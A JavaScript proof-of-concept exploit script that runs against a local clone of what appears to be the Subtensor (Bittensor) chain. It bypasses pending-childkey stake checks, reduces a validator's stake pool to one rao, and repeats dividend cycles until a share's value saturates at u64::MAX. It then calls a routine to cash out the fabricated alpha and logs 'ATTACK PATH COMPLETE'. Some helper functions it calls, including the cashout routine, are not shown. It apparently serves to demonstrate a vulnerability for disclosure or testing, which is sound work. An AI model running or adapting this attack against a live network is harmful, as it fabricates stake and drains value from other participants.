import assert from "node:assert/strict";

import { Keyring } from "@polkadot/api";
import { u8aToHex } from "@polkadot/util";
import { cryptoWaitReady } from "@polkadot/util-crypto";

import { connectApi } from "../lib/api.js";
import { createTempLogger } from "../lib/file-log.js";

const WS_ENDPOINT = "ws://127.0.0.1:9944";
const NETUID = 64;
const ROOT_NETUID = 0;
const RAO_PER_TAO = 1_000_000_000n;
const FUNDING = 10_000n * RAO_PER_TAO;
const TEMPORARY_ROOT_STAKE = 1_000n * RAO_PER_TAO;
const TARGET_STAKE = 1_101_000_000_000n;
const MOVE_TO_DAVE = 100_000_000n;
const FABRICATED_ALPHA_MOVE = 100_000_000n * RAO_PER_TAO;
const U64_MAX = 18_446_744_073_709_551_615n;
const SAFE_FLOAT_MAX = 1_000_000_000_000_000_000_000n;
const TEMPO = 10;
const CHILDKEY_TAKE = 11_796;
const MAX_DIVIDEND_CYCLES = 32;
const TOP_UP_TAO = 10_000_000n;
const PENDING_VALIDATOR_EMISSION_BOOST = 1_000_000n * RAO_PER_TAO;

const logger = createTempLogger("test-childkey-transfer-sharepool-saturation.log");
logger.captureConsole();

let api;
let copiedWeightTemplate;

async function main() {
  await logger.start();
  api = await connectApi(WS_ENDPOINT, { log: console.log, timeoutMs: 180_000 });

  try {
    await cryptoWaitReady();
    const keyring = new Keyring({ type: "sr25519" });
    const alice = keyring.addFromUri("//Alice");
    const bob = keyring.addFromUri("//Bob");
    const charlie = keyring.addFromUri("//Charlie");
    const dave = keyring.addFromUri("//Dave");
    const eve = keyring.addFromUri("//Eve");
    const ferdie = keyring.addFromUri("//Ferdie");

    console.log("addresses:", JSON.stringify({
      alice: alice.address,
      bob: bob.address,
      charlie: charlie.address,
      dave: dave.address,
      eve: eve.address,
      ferdie: ferdie.address,
    }));
    console.log("mapping: C0=Bob C1=Ferdie P=Charlie H=Dave Q=Eve");

    assertMetadata();
    await verifyBlockProduction();

    const sudoKey = await api.query.sudo.key();
    assert.equal(sudoKey.unwrap().toString(), alice.address, "Alice must be the local sudo key");

    await resetCloneEmissionHeightGates(alice);
    await resetCopiedRootRegistrationHeights(alice);
    await configureCloneOnlyWaits(alice);

    await transferFunding(alice, bob.address, "Alice -> Bob");
    await transferFunding(alice, ferdie.address, "Alice -> Ferdie");

    await burnedRegister(bob, charlie.address, "Bob registers Charlie");
    await rootRegister(bob, charlie.address, "Bob root-registers Charlie");
    await burnedRegister(ferdie, dave.address, "Ferdie registers Dave");
    await resetCopiedWeightDestinationHeights(alice, dave.address);
    await clearEmptyDaveSharePool(alice, dave.address);

    await exercisePendingChildkeyBypass(alice, bob, charlie.address, dave.address, eve.address);
    await configureDaveTakes(ferdie, dave.address);
    await stakeBobCharlieExactly(bob, charlie.address, ferdie.address);
    await ensureDaveValidatorPermit(alice, dave.address);
    await copyValidatorWeights(dave, 1);
    await boostPendingValidatorEmission(alice, "initial Dave dividend");

    const initialState = await positionState(charlie.address, dave.address, bob.address, ferdie.address);
    console.log("initial positions:", formatState(initialState));
    assert.equal(initialState.bobCharlie, TARGET_STAKE, "Bob/Charlie must start at exactly 1101 alpha");
    assert.equal(initialState.bobDave, 0n, "Bob/Dave must start empty");
    assert.equal(initialState.ferdieDave, 0n, "Ferdie/Dave must start empty");

    await submitAndWait(
      bob,
      api.tx.subtensorModule.moveStake(
        charlie.address,
        dave.address,
        NETUID,
        NETUID,
        MOVE_TO_DAVE.toString()
      ),
      "Bob moves A=0.1 alpha Charlie -> Dave"
    );

    const firstDividend = await waitForDaveDividend(
      charlie.address,
      dave.address,
      bob.address,
      ferdie.address,
      "initial Dave pool-wide dividend"
    );
    assert.ok(firstDividend.daveEmission > 0n, "Dave must receive a positive pool-wide dividend");
    const transferFloor = await readSameSubnetTransferFloor();
    const seedMinimum = transferFloor.minimumAlpha * 2n;
    const seed = selectSeedAmount(firstDividend.after.daveTotal, seedMinimum);
    console.log(
      "bit-exact live seed selected:",
      `observedDaveValue=${firstDividend.after.daveTotal}`,
      `minimumTransferAlpha=${transferFloor.minimumAlpha}`,
      `seedMinimumWithPriceMargin=${seedMinimum}`,
      `seedTaoEquivalent=${seed.transfer * transferFloor.price / RAO_PER_TAO}`,
      `transfer=${seed.transfer}`,
      `moveBack=${seed.moveBack}`,
      `expectedBobExit=${seed.bobExit}`
    );

    await submitAndWait(
      bob,
      api.tx.subtensorModule.transferStakeAndHotkey(
        ferdie.address,
        charlie.address,
        dave.address,
        NETUID,
        NETUID,
        seed.transfer.toString()
      ),
      `Bob transfers live seed B=${seed.transfer} rao Charlie -> Ferdie/Dave`
    );
    await submitAndWait(
      ferdie,
      api.tx.subtensorModule.moveStake(
        dave.address,
        charlie.address,
        NETUID,
        NETUID,
        seed.moveBack.toString()
      ),
      `Ferdie moves B-1=${seed.moveBack} rao Dave -> Charlie`
    );

    let state = await positionState(charlie.address, dave.address, bob.address, ferdie.address);
    assert.equal(state.ferdieDave, 1n, "Ferdie/Dave must hold exactly one rao-alpha after seeding");
    const bobFullDave = state.bobDave;
    assert.equal(bobFullDave, seed.bobExit, "Bob/Dave displayed exit differs from bit-exact seed model");
    console.log("seed established:", `E=${firstDividend.daveEmission}`, formatState(state));

    await submitAndWait(
      bob,
      api.tx.subtensorModule.moveStake(
        dave.address,
        charlie.address,
        NETUID,
        NETUID,
        bobFullDave.toString()
      ),
      `Bob moves full displayed Dave stake ${bobFullDave} -> Charlie`
    );
    state = await positionState(charlie.address, dave.address, bob.address, ferdie.address);
    assert.equal(state.bobDave, 0n, "Bob/Dave must be empty after its full exit");
    assert.equal(state.daveTotal, 1n, "Dave pool value must be exactly one rao after Bob exits");
    assert.ok(state.ferdieDave >= 1n, "Ferdie/Dave one-rao share must remain live");
    console.log("one-rao vulnerable state:", formatState(state));

    let cycles = 0;
    while (state.ferdieDave !== U64_MAX && cycles < MAX_DIVIDEND_CYCLES) {
      cycles += 1;
      await boostPendingValidatorEmission(alice, `amplification dividend ${cycles}`);
      const dividend = await waitForDaveDividend(
        charlie.address,
        dave.address,
        bob.address,
        ferdie.address,
        `amplification dividend ${cycles}`
      );
      const leaveOneMove = dividend.after.daveTotal - 1n;
      assert.ok(leaveOneMove > 0n, `cycle ${cycles}: Dave dividend did not raise pool value above one`);
      await submitAndWait(
        ferdie,
        api.tx.subtensorModule.moveStake(
          dave.address,
          charlie.address,
          NETUID,
          NETUID,
          leaveOneMove.toString()
        ),
        `cycle ${cycles}: Ferdie moves Dave V-1=${leaveOneMove} -> Charlie`
      );
      state = await positionState(charlie.address, dave.address, bob.address, ferdie.address);
      assert.equal(state.daveTotal, 1n, `cycle ${cycles}: Dave pool must return to one rao`);
      console.log(`amplification cycle ${cycles}:`, `credit=${dividend.daveEmission}`, formatState(state));
    }
    assert.equal(state.ferdieDave, U64_MAX, `Ferdie/Dave did not saturate within ${MAX_DIVIDEND_CYCLES} dividends`);
    console.log("SATURATED:", `cycles=${cycles}`, `get_value(Dave,Ferdie)=${state.ferdieDave}`);

    const cashout = await executeFabricatedAlphaCashout(ferdie, charlie.address, dave.address);
    console.log("ATTACK PATH COMPLETE:", JSON.stringify(cashout, (_, value) =>
      typeof value === "bigint" ? value.toString() : value
    ));
  } finally {
    await api?.disconnect();
    await logger.flush();
  }
}

function assertMetadata() {
  const requirements = [
    ["Balances transfer", balancesTransfer()],
    ["SubtensorModule.burnedRegister", api.tx.subtensorModule?.burnedRegister],
    ["SubtensorModule.rootRegister", api.tx.subtensorModule?.rootRegister],
    ["SubtensorModule.addStake", api.tx.subtensorModule?.addStake],
    ["SubtensorModule.removeStake", api.tx.subtensorModule?.removeStake],
    ["SubtensorModule.moveStake", api.tx.subtensorModule?.moveStake],
    ["SubtensorModule.transferStakeAndHotkey", api.tx.subtensorModule?.transferStakeAndHotkey],
    ["SubtensorModule.setChildren", api.tx.subtensorModule?.setChildren],
    ["SubtensorModule.setChildkeyTake", api.tx.subtensorModule?.setChildkeyTake],
    ["SubtensorModule.decreaseTake", api.tx.subtensorModule?.decreaseTake],
    ["SubtensorModule.setPendingChildkeyCooldown", api.tx.subtensorModule?.setPendingChildkeyCooldown],
    ["SubtensorModule.sudoSetTxChildkeyTakeRateLimit", api.tx.subtensorModule?.sudoSetTxChildkeyTakeRateLimit],
    ["SubtensorModule.setWeights", api.tx.subtensorModule?.setWeights],
    ["System.setStorage", api.tx.system?.setStorage],
    ["System.killStorage", api.tx.system?.killStorage],
    ["Sudo.sudo", api.tx.sudo?.sudo],
    ["SubtensorModule.childKeys", api.query.subtensorModule?.childKeys],
    ["SubtensorModule.parentKeys", api.query.subtensorModule?.parentKeys],
    ["SubtensorModule.pendingChildKeys", api.query.subtensorModule?.pendingChildKeys],
    ["SubtensorModule.delegates", api.query.subtensorModule?.delegates],
    ["SubtensorModule.subnetTAO", api.query.subtensorModule?.subnetTAO],
    ["SubtensorModule.subnetAlphaIn", api.query.subtensorModule?.subnetAlphaIn],
    ["SubtensorModule.subnetAlphaOut", api.query.subtensorModule?.subnetAlphaOut],
    ["StakeInfoRuntimeApi.getStakeInfoForHotkeyColdkeyNetuid", api.call.stakeInfoRuntimeApi?.getStakeInfoForHotkeyColdkeyNetuid],
  ];
  for (const [name, value] of requirements) {
    assert.ok(value, `${name} is unavailable in runtime metadata`);
  }
}

async function configureCloneOnlyWaits(alice) {
  const before = {
    tempo: (await api.query.subtensorModule.tempo(NETUID)).toNumber(),
    childkeyCooldown: (await api.query.subtensorModule.pendingChildKeyCooldown()).toBigInt(),
    childkeyTakeRateLimit: (await api.query.subtensorModule.txChildkeyTakeRateLimit()).toBigInt(),
    weightsRateLimit: (await api.query.subtensorModule.weightsSetRateLimit(NETUID)).toBigInt(),
    rootImmunityPeriod: (await api.query.subtensorModule.immunityPeriod(ROOT_NETUID)).toNumber(),
  };
  await submitAndWait(
    alice,
    api.tx.sudo.sudo(api.tx.subtensorModule.setPendingChildkeyCooldown(0)),
    "Alice sudo sets pending childkey cooldown to zero",
    { expectSudoSuccess: true }
  );
  await submitAndWait(
    alice,
    api.tx.sudo.sudo(api.tx.subtensorModule.sudoSetTxChildkeyTakeRateLimit(0)),
    "Alice sudo sets childkey-take rate limit to zero",
    { expectSudoSuccess: true }
  );
  await submitAndWait(
    alice,
    api.tx.sudo.sudo(api.tx.system.setStorage([
      [api.query.subtensorModule.tempo.key(NETUID), storageValueHex("u16", TEMPO)],
      [api.query.subtensorModule.weightsSetRateLimit.key(NETUID), storageValueHex("u64", 0)],
      [api.query.subtensorModule.immunityPeriod.key(ROOT_NETUID), storageValueHex("u16", 0)],
    ])),
    "Alice sudo sets SN64 tempo and weights rate limit",
    { expectSudoSuccess: true }
  );
  const after = {
    tempo: (await api.query.subtensorModule.tempo(NETUID)).toNumber(),
    childkeyCooldown: (await api.query.subtensorModule.pendingChildKeyCooldown()).toBigInt(),
    childkeyTakeRateLimit: (await api.query.subtensorModule.txChildkeyTakeRateLimit()).toBigInt(),
    weightsRateLimit: (await api.query.subtensorModule.weightsSetRateLimit(NETUID)).toBigInt(),
    rootImmunityPeriod: (await api.query.subtensorModule.immunityPeriod(ROOT_NETUID)).toNumber(),
  };
  assert.deepEqual(after, {
    tempo: TEMPO,
    childkeyCooldown: 0n,
    childkeyTakeRateLimit: 0n,
    weightsRateLimit: 0n,
    rootImmunityPeriod: 0,
  });
  console.log(
    "clone-only waits configured:",
    `before=${JSON.stringify(before, (_, value) => typeof value === "bigint" ? value.toString() : value)}`,
    `after=${JSON.stringify(after, (_, value) => typeof value === "bigint" ? value.toString() : value)}`
  );
}

async function resetCopiedRootRegistrationHeights(alice) {
  const header = await api.rpc.chain.getHeader();
  const localBlock = header.number.toBigInt();
  const entries = await api.query.subtensorModule.blockAtRegistration.entries(ROOT_NETUID);
  const future = entries.filter(([, value]) => value.toBigInt() > localBlock);
  assert.ok(future.length >= 2, "expected at least two copied root registration heights ahead of local height");
  await submitAndWait(
    alice,
    api.tx.sudo.sudo(api.tx.system.setStorage(future.map(([key]) => [
      key.toHex(),
      storageValueHex("u64", 0),
    ]))),
    "Alice sudo resets copied root registration heights",
    { expectSudoSuccess: true }
  );
  const remaining = await api.query.subtensorModule.blockAtRegistration.entries(ROOT_NETUID);
  assert.ok(
    remaining.every(([, value]) => value.toBigInt() <= localBlock),
    "a copied root registration height is still ahead of local height"
  );
  console.log(
    "copied root registration heights reset:",
    `localBlock=${localBlock}`,
    `entries=${future.length}`
  );
}

async function rootRegister(coldkey, hotkey, label) {
  const before = await api.query.subtensorModule.uids(ROOT_NETUID, hotkey);
  assert.ok(before.isNone, `${label}: hotkey is already registered on root`);
  await submitAndWait(coldkey, api.tx.subtensorModule.rootRegister(hotkey), label);
  const after = await api.query.subtensorModule.uids(ROOT_NETUID, hotkey);
  assert.ok(after.isSome, `${label}: root registration was not stored`);
  console.log(`${label}: uid=${after.unwrap()}`);
}

async function exercisePendingChildkeyBypass(alice, bob, charlie, dave, eve) {
  assert.equal(await getStake(api, charlie, bob.address, ROOT_NETUID), 0n, "Bob/Charlie root must start empty");
  assert.equal(await getStake(api, eve, bob.address, ROOT_NETUID), 0n, "Bob/Eve root must start empty");

  await submitAndWait(
    bob,
    api.tx.subtensorModule.addStake(charlie, ROOT_NETUID, TEMPORARY_ROOT_STAKE.toString()),
    "Bob temporarily stakes 1000 TAO on root to Charlie"
  );
  assert.equal(
    await getStake(api, charlie, bob.address, ROOT_NETUID),
    TEMPORARY_ROOT_STAKE,
    "temporary Bob/Charlie root stake"
  );

  await submitAndWait(
    alice,
    api.tx.sudo.sudo(api.tx.system.setStorage([
      [api.query.subtensorModule.immunityPeriod.key(ROOT_NETUID), storageValueHex("u16", 10)],
    ])),
    "Alice sudo protects Charlie's fresh root slot while Eve registers",
    { expectSudoSuccess: true }
  );
  await rootRegister(bob, eve, "Bob root-registers Eve");
  assert.ok((await api.query.subtensorModule.uids(ROOT_NETUID, charlie)).isSome, "Eve registration pruned Charlie");
  assert.ok((await api.query.subtensorModule.uids(ROOT_NETUID, eve)).isSome, "Eve root registration missing");

  await submitAndWait(
    bob,
    api.tx.subtensorModule.setChildren(
      charlie,
      NETUID,
      [[U64_MAX.toString(), dave]]
    ),
    "Bob schedules Charlie -> Dave at u64::MAX"
  );
  let pending = await api.query.subtensorModule.pendingChildKeys(NETUID, charlie);
  assert.equal(pending[0].length, 1, "Charlie pending child relation was not scheduled");
  assert.equal(pending[0][0][0].toBigInt(), U64_MAX, "pending child proportion");
  assert.equal(pending[0][0][1].toString(), dave, "pending child hotkey");

  await submitAndWait(
    bob,
    api.tx.subtensorModule.moveStake(
      charlie,
      eve,
      ROOT_NETUID,
      ROOT_NETUID,
      TEMPORARY_ROOT_STAKE.toString()
    ),
    "Bob moves root position Charlie -> Eve"
  );
  assert.equal(await getStake(api, charlie, bob.address, ROOT_NETUID), 0n, "Bob/Charlie root after move");
  assert.equal(await getStake(api, eve, bob.address, ROOT_NETUID), TEMPORARY_ROOT_STAKE, "Bob/Eve root after move");
  pending = await api.query.subtensorModule.pendingChildKeys(NETUID, charlie);
  assert.equal(pending[0].length, 1, "Charlie pending child relation was cleared by the root move");

  await submitAndWait(
    bob,
    api.tx.subtensorModule.removeStake(eve, ROOT_NETUID, TEMPORARY_ROOT_STAKE.toString()),
    "Bob fully removes temporary root stake from Eve"
  );
  assert.equal(await getStake(api, eve, bob.address, ROOT_NETUID), 0n, "Bob/Eve root after removal");
  pending = await api.query.subtensorModule.pendingChildKeys(NETUID, charlie);
  assert.equal(pending[0].length, 1, "Charlie pending child relation was cleared by Eve cash-out");
  console.log(
    "pending child relation survived root stake recovery:",
    `cooldownBlock=${pending[1]}`,
    `CharlieRoot=${await getStake(api, charlie, bob.address, ROOT_NETUID)}`,
    `EveRoot=${await getStake(api, eve, bob.address, ROOT_NETUID)}`
  );

  const epochIndex = (await api.query.subtensorModule.subnetEpochIndex(NETUID)).toBigInt();
  const anchor = (await api.query.subtensorModule.lastEpochBlock(NETUID)).toBigInt();
  const activation = await waitForNextEpoch(anchor, epochIndex);
  const [children, parents] = await Promise.all([
    activation.view.query.subtensorModule.childKeys(charlie, NETUID),
    activation.view.query.subtensorModule.parentKeys(dave, NETUID),
  ]);
  assert.equal(children.length, 1, "Charlie child relation did not activate at the target-subnet epoch");
  assert.equal(children[0][0].toBigInt(), U64_MAX, "active child proportion");
  assert.equal(children[0][1].toString(), dave, "active child hotkey");
  assert.equal(parents.length, 1, "Dave parent relation did not activate");
  assert.equal(parents[0][0].toBigInt(), U64_MAX, "active parent proportion");
  assert.equal(parents[0][1].toString(), charlie, "active parent hotkey");
  assert.equal((await activation.view.query.subtensorModule.pendingChildKeys(NETUID, charlie))[0].length, 0);
  console.log(
    "child relation activated without rechecking Charlie stake:",
    `block=${activation.blockNumber}`,
    `epochIndex=${activation.epochIndex}`
  );
}

async function configureDaveTakes(ferdie, dave) {
  await submitAndWait(
    ferdie,
    api.tx.subtensorModule.setChildkeyTake(dave, NETUID, CHILDKEY_TAKE),
    `Ferdie sets Dave childkey take to ${CHILDKEY_TAKE}`
  );
  await submitAndWait(
    ferdie,
    api.tx.subtensorModule.decreaseTake(dave, 0),
    "Ferdie reduces Dave delegate take to zero"
  );
  assert.equal((await api.query.subtensorModule.childkeyTake(dave, NETUID)).toNumber(), CHILDKEY_TAKE);
  assert.equal((await api.query.subtensorModule.delegates(dave)).toNumber(), 0);
  console.log("Dave takes configured:", `childkeyTake=${CHILDKEY_TAKE}`, "delegateTake=0");
}

async function resetCloneEmissionHeightGates(alice) {
  const header = await api.rpc.chain.getHeader();
  const localBlock = header.number.toBigInt();
  const registrationEntries = await api.query.subtensorModule.blockAtRegistration.entries(NETUID);
  const registrationBlocks = registrationEntries.map(([, value]) => value.toBigInt());
  const before = {
    firstEmissionBlock: (await api.query.subtensorModule.firstEmissionBlockNumber(NETUID))
      .unwrapOrDefault()
      .toBigInt(),
    lastMechanismStepBlock: (await api.query.subtensorModule.lastMechansimStepBlock(NETUID)).toBigInt(),
    lastEpochBlock: (await api.query.subtensorModule.lastEpochBlock(NETUID)).toBigInt(),
    blocksSinceLastStep: (await api.query.subtensorModule.blocksSinceLastStep(NETUID)).toBigInt(),
    pendingEpochAt: (await api.query.subtensorModule.pendingEpochAt(NETUID)).toBigInt(),
    emissionGateBar: (await api.query.subtensorModule.emissionGateBar()).toHex(),
    pendingServer: (await api.query.subtensorModule.pendingServerEmission(NETUID)).toBigInt(),
    pendingValidator: (await api.query.subtensorModule.pendingValidatorEmission(NETUID)).toBigInt(),
    maxRegistrationBlock: registrationBlocks.reduce(
      (maximum, value) => value > maximum ? value : maximum,
      0n
    ),
  };
  console.log(
    "clone emission-height gates before reset:",
    `localBlock=${localBlock}`,
    Object.entries(before).map(([key, value]) => `${key}=${value}`).join(" ")
  );

  assert.ok(
    before.firstEmissionBlock > localBlock
      || before.lastMechanismStepBlock > localBlock
      || before.maxRegistrationBlock > localBlock,
    "expected at least one cloned SN64 emission-height marker to be ahead of the local chain"
  );

  const resetEntries = [
    [api.query.subtensorModule.firstEmissionBlockNumber.key(NETUID), storageValueHex("u64", localBlock)],
    [api.query.subtensorModule.lastMechansimStepBlock.key(NETUID), storageValueHex("u64", localBlock)],
    [api.query.subtensorModule.lastEpochBlock.key(NETUID), storageValueHex("u64", localBlock)],
    [api.query.subtensorModule.blocksSinceLastStep.key(NETUID), storageValueHex("u64", 0)],
    [api.query.subtensorModule.pendingEpochAt.key(NETUID), storageValueHex("u64", 0)],
    [api.query.subtensorModule.emissionGateBar.key(), storageValueHex("u128", 0)],
  ];

  const resetResult = await submitAndWait(
    alice,
    api.tx.sudo.sudo(api.tx.system.setStorage(resetEntries)),
    "Alice sudo resets cloned SN64 emission-height gates",
    { expectSudoSuccess: true }
  );
  const resetView = await api.at(resetResult.blockHash);
  const resetBlock = resetResult.blockNumber;
  assert.equal(
    (await resetView.query.subtensorModule.firstEmissionBlockNumber(NETUID)).unwrap().toBigInt(),
    localBlock,
    "FirstEmissionBlockNumber reset"
  );
  assert.equal(
    (await resetView.query.subtensorModule.lastMechansimStepBlock(NETUID)).toBigInt(),
    localBlock,
    "LastMechansimStepBlock reset"
  );
  assert.equal(
    (await resetView.query.subtensorModule.lastEpochBlock(NETUID)).toBigInt(),
    localBlock,
    "LastEpochBlock reset"
  );
  console.log(
    "clone emission-height gates reset:",
    `includedBlock=${resetBlock}`,
    `markerBlock=${localBlock}`,
    `entries=${resetEntries.length}`
  );

  const pendingAtReset =
    (await resetView.query.subtensorModule.pendingServerEmission(NETUID)).toBigInt()
    + (await resetView.query.subtensorModule.pendingValidatorEmission(NETUID)).toBigInt();
  const deadline = Date.now() + 120_000;
  while (Date.now() < deadline) {
    const currentHeader = await api.rpc.chain.getHeader();
    if (currentHeader.number.toBigInt() > resetBlock) {
      const view = await api.at(currentHeader.hash);
      const pendingNow =
        (await view.query.subtensorModule.pendingServerEmission(NETUID)).toBigInt()
        + (await view.query.subtensorModule.pendingValidatorEmission(NETUID)).toBigInt();
      if (pendingNow > pendingAtReset) {
        console.log(
          "SN64 emissions resumed after height reset:",
          `block=${currentHeader.number}`,
          `pendingBefore=${pendingAtReset}`,
          `pendingAfter=${pendingNow}`,
          `increase=${pendingNow - pendingAtReset}`
        );
        return;
      }
    }
    await delay(500);
  }
  throw new Error("SN64 pending emission did not resume within 120 seconds after height-gate reset");
}

async function resetCopiedWeightDestinationHeights(alice, daveAddress) {
  const daveUidOption = await api.query.subtensorModule.uids(NETUID, daveAddress);
  assert.ok(daveUidOption.isSome, "Dave must be registered before preparing copied weights");
  const daveUid = daveUidOption.unwrap().toNumber();
  copiedWeightTemplate = await selectCopiedWeightTemplate(daveUid);

  const header = await api.rpc.chain.getHeader();
  const localBlock = header.number.toBigInt();
  const lastUpdates = Array.from(
    await api.query.subtensorModule.lastUpdate(NETUID),
    (value) => value.toBigInt()
  );
  const destinationHeights = await Promise.all(
    copiedWeightTemplate.destinations.map(async (uid) => ({
      uid,
      height: (await api.query.subtensorModule.blockAtRegistration(NETUID, uid)).toBigInt(),
    }))
  );
  const stale = destinationHeights.filter(({ height }) => height > localBlock);
  console.log(
    "copied-weight destination heights before reset:",
    `sourceUid=${copiedWeightTemplate.uid}`,
    `localBlock=${localBlock}`,
    `maxLastUpdate=${lastUpdates.reduce((maximum, value) => value > maximum ? value : maximum, 0n)}`,
    `stale=${JSON.stringify(stale.map(({ uid, height }) => [uid, height.toString()]))}`
  );
  assert.ok(stale.length > 0, "expected copied-weight destinations with cloned future registration heights");

  const entries = stale.map(({ uid }) => [
    api.query.subtensorModule.blockAtRegistration.key(NETUID, uid),
    storageValueHex("u64", 0),
  ]);
  entries.push([
    api.query.subtensorModule.lastUpdate.key(NETUID),
    storageValueHex("Vec<u64>", lastUpdates.map(() => 0)),
  ]);
  await submitAndWait(
    alice,
    api.tx.sudo.sudo(api.tx.system.setStorage(entries)),
    "Alice sudo resets copied-weight destination registration heights",
    { expectSudoSuccess: true }
  );
  const after = await Promise.all(
    stale.map(({ uid }) => api.query.subtensorModule.blockAtRegistration(NETUID, uid))
  );
  assert.ok(after.every((value) => value.toBigInt() === 0n), "copied-weight destination height reset");
  assert.ok(
    Array.from(await api.query.subtensorModule.lastUpdate(NETUID), (value) => value.toBigInt())
      .every((value) => value === 0n),
    "cloned LastUpdate reset"
  );
  console.log(
    "copied-weight destination registration heights and LastUpdate reset:",
    `entries=${entries.length}`
  );
}

async function selectCopiedWeightTemplate(daveUid) {
  const [entries, permits] = await Promise.all([
    api.query.subtensorModule.weights.entries(NETUID),
    api.query.subtensorModule.validatorPermit(NETUID),
  ]);
  const source = entries
    .map(([key, value]) => ({ uid: key.args[1].toNumber(), row: Array.from(value) }))
    .filter(({ uid, row }) => uid !== daveUid && row.length > 0 && permits[uid]?.valueOf())
    .sort((left, right) => right.row.length - left.row.length)[0];
  assert.ok(source, "no existing validator weight row is available to copy");
  return {
    uid: source.uid,
    destinations: source.row.map(([uid]) => uid.toNumber()),
    weights: source.row.map(([, weight]) => weight.toNumber()),
  };
}

async function clearEmptyDaveSharePool(alice, daveAddress) {
  const totalAlpha = (await api.query.subtensorModule.totalHotkeyAlpha(daveAddress, NETUID)).toBigInt();
  assert.equal(totalAlpha, 0n, "Dave share pool must have zero value before stale-share cleanup");

  const [alphaV1Entries, alphaV2Entries, denominatorV1, denominatorV2] = await Promise.all([
    api.query.subtensorModule.alpha.entries(daveAddress),
    api.query.subtensorModule.alphaV2.entries(daveAddress),
    api.query.subtensorModule.totalHotkeyShares(daveAddress, NETUID),
    api.query.subtensorModule.totalHotkeySharesV2(daveAddress, NETUID),
  ]);
  const onSubnet = ([key]) => key.args[2].toNumber() === NETUID;
  const staleV1 = alphaV1Entries.filter(onSubnet);
  const staleV2 = alphaV2Entries.filter(onSubnet);
  console.log(
    "empty Dave share pool before cleanup:",
    `totalAlpha=${totalAlpha}`,
    `alphaV1Rows=${staleV1.length}`,
    `alphaV2Rows=${staleV2.length}`,
    `denominatorV1=${denominatorV1}`,
    `denominatorV2=${denominatorV2}`
  );

  const keys = [
    ...staleV1.map(([key]) => key.toHex()),
    ...staleV2.map(([key]) => key.toHex()),
    api.query.subtensorModule.totalHotkeyShares.key(daveAddress, NETUID),
    api.query.subtensorModule.totalHotkeySharesV2.key(daveAddress, NETUID),
  ];
  await submitAndWait(
    alice,
    api.tx.sudo.sudo(api.tx.system.killStorage(keys)),
    "Alice sudo clears zero-valued cloned Dave share rows",
    { expectSudoSuccess: true }
  );

  const [remainingV1, remainingV2, clearedV1, clearedV2] = await Promise.all([
    api.query.subtensorModule.alpha.entries(daveAddress),
    api.query.subtensorModule.alphaV2.entries(daveAddress),
    api.query.subtensorModule.totalHotkeyShares(daveAddress, NETUID),
    api.query.subtensorModule.totalHotkeySharesV2(daveAddress, NETUID),
  ]);
  assert.equal(remainingV1.filter(onSubnet).length, 0, "Dave Alpha rows cleared");
  assert.equal(remainingV2.filter(onSubnet).length, 0, "Dave AlphaV2 rows cleared");
  assert.equal(BigInt(clearedV1.toHex()), 0n, "Dave TotalHotkeyShares cleared");
  assert.equal(BigInt(clearedV2.toHex()), 0n, "Dave TotalHotkeySharesV2 cleared");
  console.log("zero-valued cloned Dave share pool cleared:", `keys=${keys.length}`);
}

async function copyValidatorWeights(dave, round) {
  const daveUidOption = await api.query.subtensorModule.uids(NETUID, dave.address);
  assert.ok(daveUidOption.isSome, `round ${round}: Dave must be registered before setting weights`);
  const daveUid = daveUidOption.unwrap().toNumber();
  const commitReveal = await api.query.subtensorModule.commitRevealWeightsEnabled(NETUID);
  assert.equal(commitReveal.valueOf(), false, `round ${round}: direct setWeights requires commit-reveal disabled`);

  const [versionKey, rateLimit] = await Promise.all([
    api.query.subtensorModule.weightsVersionKey(NETUID),
    api.query.subtensorModule.weightsSetRateLimit(NETUID),
  ]);
  assert.ok(copiedWeightTemplate, `round ${round}: copied weight template must be prepared`);
  const { uid: sourceUid, destinations, weights } = copiedWeightTemplate;
  const waitResult = await waitUntilWeightsEligible(daveUid, rateLimit.toBigInt(), round);
  console.log(
    `round ${round}: copying validator weights`,
    `sourceUid=${sourceUid}`,
    `daveUid=${daveUid}`,
    `entries=${destinations.length}`,
    `rateLimit=${rateLimit}`,
    `waitedBlocks=${waitResult.waitedBlocks}`,
    `destinations=${JSON.stringify(destinations)}`,
    `weights=${JSON.stringify(weights)}`
  );
  await submitAndWait(
    dave,
    api.tx.subtensorModule.setWeights(
      NETUID,
      destinations,
      weights,
      versionKey.toString()
    ),
    `round ${round}: Dave copies UID ${sourceUid} weights`
  );
}

async function waitUntilWeightsEligible(uid, rateLimit, round) {
  const start = (await api.rpc.chain.getHeader()).number.toBigInt();
  let lastLoggedBlock = -1n;
  while (true) {
    const header = await api.rpc.chain.getHeader();
    const current = header.number.toBigInt();
    const lastUpdates = await api.query.subtensorModule.lastUpdate(NETUID);
    const last = uid < lastUpdates.length ? lastUpdates[uid].toBigInt() : 0n;
    if (last === 0n || current - last >= rateLimit) {
      return { waitedBlocks: current - start, current, last };
    }
    if ((current - start) % 10n === 0n && current !== lastLoggedBlock) {
      lastLoggedBlock = current;
      console.log(
        `round ${round}: waiting for Dave weight rate limit`,
        `current=${current}`,
        `last=${last}`,
        `required=${rateLimit}`
      );
    }
    await delay(250);
  }
}

function balancesTransfer(destination, amount) {
  const call = api.tx.balances.transferKeepAlive ?? api.tx.balances.transferAllowDeath ?? api.tx.balances.transfer;
  if (destination === undefined) return call;
  return call(destination, amount);
}

async function verifyBlockProduction() {
  let previous = (await api.rpc.chain.getHeader()).number.toBigInt();
  let advances = 0;
  while (advances < 2) {
    await delay(1_000);
    const current = (await api.rpc.chain.getHeader()).number.toBigInt();
    if (current > previous) advances += 1;
    previous = current;
  }
  console.log("block production verified at:", previous.toString());
}

async function transferFunding(alice, destination, label) {
  const before = (await api.query.system.account(destination)).data.free.toBigInt();
  const result = await submitAndWait(alice, balancesTransfer(destination, FUNDING.toString()), label);
  const view = await api.at(result.blockHash);
  const after = (await view.query.system.account(destination)).data.free.toBigInt();
  assert.equal(after - before, FUNDING, `${label} recipient balance delta`);
  console.log(`${label}:`, `before=${before}`, `after=${after}`, `transferred=${FUNDING}`);
}

async function burnedRegister(coldkey, hotkey, label) {
  const before = await api.query.subtensorModule.uids(NETUID, hotkey);
  assert.ok(before.isNone, `${label}: hotkey is already registered on subnet ${NETUID}`);
  const burn = await api.query.subtensorModule.burn(NETUID);
  console.log(`${label}: current burn=${burn}`);
  const result = await submitAndWait(
    coldkey,
    api.tx.subtensorModule.burnedRegister(NETUID, hotkey),
    label
  );
  const view = await api.at(result.blockHash);
  const uid = await view.query.subtensorModule.uids(NETUID, hotkey);
  assert.ok(uid.isSome, `${label}: registration was not stored`);
  console.log(`${label}: uid=${uid.unwrap()}`);
}

